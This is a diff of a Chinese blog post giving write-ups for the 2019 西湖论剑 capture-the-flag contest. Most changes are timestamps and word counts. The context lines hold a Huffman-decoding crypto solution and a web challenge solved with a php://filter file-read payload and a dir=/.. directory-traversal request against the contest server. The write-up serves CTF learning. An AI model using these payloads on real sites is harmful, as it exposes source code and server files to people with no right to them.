@@ -89,7 +89,7 @@
 <meta property="og:site_name" content="晨曦远的博客">
 <meta property="og:description" content="#CRYPTO哈夫曼之谜123456789101111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110a:4d:9g:1f:5l:10:75:9&amp;#123;:1&amp;#125;:1 123456import huffmanimport collec">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-07T08:20:46.044Z">
+<meta property="og:updated_time" content="2019-05-07T12:46:16.149Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="西湖论剑2019">
 <meta name="twitter:description" content="#CRYPTO哈夫曼之谜123456789101111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110a:4d:9g:1f:5l:10:75:9&amp;#123;:1&amp;#125;:1 123456import huffmanimport collec">
@@ -344,8 +344,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-04-07T16:20:46+08:00">
-                2019-04-07
+              <time title="更新于" itemprop="dateModified" datetime="2019-05-07T20:46:16+08:00">
+                2019-05-07
               </time>
             
           </span>
@@ -423,6 +423,7 @@
       
         <p>#CRYPTO哈夫曼之谜<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:4</span></span><br><span class="line"><span class="selector-tag">d</span><span class="selector-pseudo">:9</span></span><br><span class="line"><span class="selector-tag">g</span><span class="selector-pseudo">:1</span></span><br><span class="line"><span class="selector-tag">f</span><span class="selector-pseudo">:5</span></span><br><span class="line"><span class="selector-tag">l</span><span class="selector-pseudo">:1</span></span><br><span class="line"><span class="selector-tag">0</span><span class="selector-pseudo">:7</span></span><br><span class="line"><span class="selector-tag">5</span><span class="selector-pseudo">:9</span></span><br><span class="line">&#123;<span class="selector-pseudo">:1</span></span><br><span class="line">&#125;<span class="selector-pseudo">:1</span></span><br></pre></td></tr></table></figure></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> huffman</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line">t1=huffman.codebook([(<span class="string">'a'</span>, <span class="number">4</span>), (<span class="string">'d'</span>, <span class="number">9</span>), (<span class="string">'g'</span>, <span class="number">1</span>), (<span class="string">'f'</span>, <span class="number">5</span>),(<span class="string">'l'</span>, <span class="number">1</span>),(<span class="string">'0'</span>, <span class="number">7</span>),(<span class="string">'5'</span>, <span class="number">9</span>),(<span class="string">'&#123;'</span>, <span class="number">1</span>),(<span class="string">'&#125;'</span>, <span class="number">1</span>)])</span><br><span class="line">print(t1)</span><br><span class="line"><span class="comment">#&#123;'a': '000', 'd': '10', 'g': '00100', 'f': '110', 'l': '00101', '0': '111', '5': '01', '&#123;': '00111', '&#125;': '00110'&#125;</span></span><br><span class="line"><span class="comment">#得到f&#123;algddf5dfd0f05550500a5af55dd0d5d0ad&#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <p>#babyt3<br><a href="http://ctf1.linkedbyx.com:10300" target="_blank" rel="noopener">http://ctf1.linkedbyx.com:10300</a><br>首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码<br>payload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://ctf1.linkedbyx.com:<span class="number">10300</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure></p>
 <p>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p>
 <p>scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的<br>payload：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf1.linkedbyx.com:<span class="number">10300</span><span class="regexp">/dir.php?dir=/</span>..</span><br></pre></td></tr></table></figure></p>
@@ -472,7 +473,7 @@
 
     
       <div>
-         <ul class="post-copyright"> <li class="post-copyright-author"> <strong>本文标题:</strong> <a href="/2019/04/07/西湖论剑2019/">西湖论剑2019</a> </li> <li class="post-copyright-author"> <strong>本文作者：</strong>晨曦远 </li> <li class="post-copyright-author"> <strong>发布时间:</strong>2019年04月07日 - 09:04 </li> <li class="post-copyright-author"> <strong>最后更新:</strong>2019年04月07日 - 16:04 </li> <li class="post-copyright-link"> <strong>本文链接：</strong> <a href="http://chenxiyuan.vip/2019/04/07/西湖论剑2019/" title="西湖论剑2019">http://chenxiyuan.vip/2019/04/07/西湖论剑2019/</a> </li> <li class="post-copyright-license"> <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！ </li> </ul> 
+         <ul class="post-copyright"> <li class="post-copyright-author"> <strong>本文标题:</strong> <a href="/2019/04/07/西湖论剑2019/">西湖论剑2019</a> </li> <li class="post-copyright-author"> <strong>本文作者：</strong>晨曦远 </li> <li class="post-copyright-author"> <strong>发布时间:</strong>2019年04月07日 - 09:04 </li> <li class="post-copyright-author"> <strong>最后更新:</strong>2019年05月07日 - 20:05 </li> <li class="post-copyright-link"> <strong>本文链接：</strong> <a href="http://chenxiyuan.vip/2019/04/07/西湖论剑2019/" title="西湖论剑2019">http://chenxiyuan.vip/2019/04/07/西湖论剑2019/</a> </li> <li class="post-copyright-license"> <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！ </li> </ul> 
 
 
 
@@ -722,7 +723,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">7.1k</span>
+    <span title="Site words total count">7.9k</span>
   
 </div>
 
